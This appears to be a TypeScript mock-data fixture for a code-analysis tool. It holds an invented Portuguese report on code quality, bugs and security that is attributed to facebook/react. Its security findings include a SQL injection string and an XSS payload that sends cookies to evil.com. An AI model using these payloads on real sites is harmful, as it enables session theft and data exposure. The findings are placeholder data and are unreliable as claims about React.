import type { ReporterOutput } from "../types";

export const mockAnalysisResult: ReporterOutput = {
  repoUrl: "https://github.com/facebook/react",
  filesAnalyzed: 47,
  overallScore: 67,
  executiveSummary:
    "O repositório apresenta uma arquitetura bem organizada com padrões reconhecíveis, porém possui vulnerabilidades críticas de segurança que precisam ser endereçadas urgentemente. A qualidade de código é regular, com algumas funções excessivamente longas e uso de tipos inconsistentes.",
  generatedAt: new Date().toISOString(),
  sections: {
    quality: {
      score: 72,
      metrics: {
        averageFunctionLength: 38,
        duplicatedBlocks: 5,
        filesWithoutTypes: 3,
      },
      issues: [
        {
          file: "src/utils/helpers.ts",
          line: 45,
          type: "FUNCAO_MUITO_LONGA",
          description:
            "A função processData tem 120 linhas e múltiplas responsabilidades.",
          suggestion:
            "Extrair lógica de validação e transformação em funções menores: validateInput() e transformOutput().",
        },
        {
          file: "src/services/api.ts",
          line: 12,
          type: "TIPO_AUSENTE",
          description:
            "Uso de 'any' no parâmetro da função fetchUserData.",
          suggestion:
            "Definir interface UserData e tipar o parâmetro explicitamente.",
        },
        {
          file: "src/components/Header.tsx",
          line: 78,
          type: "NOME_POUCO_DESCRITIVO",
          description:
            "Variável 'd' utilizada para representar dados de usuário.",
          suggestion:
            "Renomear para 'userData' ou 'currentUser' para maior clareza.",
        },
        {
          file: "src/hooks/useAuth.ts",
          line: 33,
          type: "COMENTARIO_EXCESSIVO",
          description:
            "Bloco de 15 linhas de comentários explicando uma lógica simples.",
          suggestion:
            "Refatorar o código para que seja autoexplicativo e reduzir comentários.",
        },
      ],
    },
    bugs: {
      bugs: [
        {
          id: "BUG-001",
          severity: "HIGH",
          file: "src/services/auth.ts",
          line: 67,
          description:
            "Promise sem tratamento de erro: chamada a fetch() sem .catch() ou try/catch.",
          suggestion:
            "Envolver em try/catch e tratar erro de rede com mensagem amigável ao usuário.",
        },
        {
          id: "BUG-002",
          severity: "MEDIUM",
          file: "src/components/UserList.tsx",
          line: 23,
          description:
            "Mutação direta de estado: state.users.push(item) modifica o array original.",
          suggestion:
            "Usar spread operator: setState([...state.users, item]).",
        },
        {
          id: "BUG-003",
          severity: "LOW",
          file: "src/utils/format.ts",
          line: 5,
          description:
            "Magic number 86400000 usado sem explicação (milissegundos em um dia).",
          suggestion:
            "Extrair para constante MS_PER_DAY = 86_400_000 com nome descritivo.",
        },
      ],
    },
    security: {
      score: 35,
      summary:
        "Foram encontradas 5 vulnerabilidades, sendo 2 críticas que requerem ação imediata. O repositório possui secrets hardcoded e endpoints sem proteção CORS.",
      vulnerabilities: [
        {
          id: "SEC-001",
          severity: "CRITICAL",
          category: "HARDCODED_SECRET",
          file: "src/config/env.ts",
          line: 3,
          description:
            "API key do Stripe exposta diretamente no código-fonte: STRIPE_SECRET_KEY='sk_live_...'",
          exploitationPath:
            "Um atacante com acesso ao repositório (mesmo público) pode extrair a chave e realizar transações fraudulentas ou acessar dados financeiros dos clientes.",
          recommendation:
            "Mover a chave para variável de ambiente (process.env.STRIPE_SECRET_KEY) e adicionar .env ao .gitignore. Revogar a chave atual imediatamente.",
          owasp: "A07:2021 - Identification and Authentication Failures",
        },
        {
          id: "SEC-002",
          severity: "CRITICAL",
          category: "SQL_INJECTION",
          file: "src/database/queries.ts",
          line: 42,
          description:
            "Query SQL construída por concatenação direta: query('SELECT * FROM users WHERE id = ' + req.params.id)",
          exploitationPath:
            "O atacante injeta SQL via parâmetro da URL: /api/users/1' OR '1'='1' --. Isso retorna todos os registros da tabela users, incluindo senhas hasheadas e dados pessoais.",
          recommendation:
            "Usar query parameterized: query('SELECT * FROM users WHERE id = $1', [req.params.id]). Aplicar ORM como Prisma ou Knex para abstrair queries.",
          owasp: "A03:2021 - Injection",
        },
        {
          id: "SEC-003",
          severity: "HIGH",
          category: "XSS",
          file: "src/components/Comment.tsx",
          line: 15,
          description:
            "Uso de dangerouslySetInnerHTML com conteúdo do usuário sem sanitização.",
          exploitationPath:
            "O atacante envia um comentário com <script>fetch('https://evil.com/?cookie='+document.cookie)</script>. Quando outro usuário visualiza o comentário, o script executa e rouba a sessão.",
          recommendation:
            "Remover dangerouslySetInnerHTML. Usar react-markdown ou DOMPurify para sanitizar HTML. Preferencialmente, renderizar apenas texto puro.",
          owasp: "A03:2021 - Injection",
        },
        {
          id: "SEC-004",
          severity: "MEDIUM",
          category: "CORS_PERMISSIVO",
          file: "src/server/middleware.ts",
          line: 8,
          description:
            "CORS configurado com Access-Control-Allow-Origin: * em ambiente de produção.",
          exploitationPath:
            "Um site malicioso pode fazer requisições autenticadas à API em nome do usuário logado, roubando dados ou executando ações não autorizadas.",
          recommendation:
            "Configurar CORS com lista explícita de domínios permitidos: origin: ['https://meusite.com', 'https://admin.meusite.com'].",
          owasp: "A05:2021 - Security Misconfiguration",
        },
        {
          id: "SEC-005",
          severity: "MEDIUM",
          category: "INFO_EXPOSURE",
          file: "src/server/errorHandler.ts",
          line: 22,
          description:
            "Stack trace completo exposto nas respostas de erro da API.",
          exploitationPath:
            "O atacante induce erros (ex: envio de JSON inválido) e analisa o stack trace para mapear a estrutura interna do servidor, identificando bibliotecas vulneráveis e rotas secretas.",
          recommendation:
            "Em produção, retornar apenas mensagem genérica. Logar stack trace internamente. Usar middleware de tratamento de erros que filtra dados sensíveis.",
          owasp: "A04:2021 - Insecure Design",
        },
      ],
    },
  },
};
